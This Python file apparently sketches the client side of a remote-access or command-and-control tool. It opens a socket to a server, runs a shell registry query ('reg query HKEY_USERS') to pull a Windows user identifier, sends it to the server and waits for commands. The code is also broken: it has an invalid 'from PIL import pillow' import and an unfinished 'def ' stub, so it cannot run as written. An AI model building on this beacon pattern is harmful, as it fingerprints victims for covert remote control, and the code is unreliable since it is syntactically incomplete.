import socket
import os
import subprocess
import json
from PIL import pillow
class client:
    def __init__(self, ip, port, timeout):
        self.ip = ip
        self.port = port
        self.socket = socket.socket()
        self.socket.connect((self.ip,self.port))
        self.socket.settimeout(timeout)
        self.active = True
    def gethwid(self) -> str:
        if os.name == "nt":
            data = "reg query HKEY_USERS"
            runcmd = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE)
            return runcmd.stdout.read().decode().split("\n")[4][11:40]
        return "UNKNOWN. POSSIBLY ON LINUX"
    
    def get_contents(self):
        values = {'hwid': self.gethwid()}
        data = json.dumps(values).encode('utf-8')
        return data

    def connect(self):
        data = self.get_contents()
        self.send(data)
        self.menu()
    
    def menu(self):
        while self.active:
            data  = self.socket.recv(4096).decode()
            if data == "HEXBYTE v.10":
                self.send(self.get_contents())
            elif data == "exit":
                self.active = False

    def send(self, packet):
        self.socket.sendall(str(len(packet)).encode('utf-8') + b" " + packet)

    def 

client("localhost", 1234, None).connect()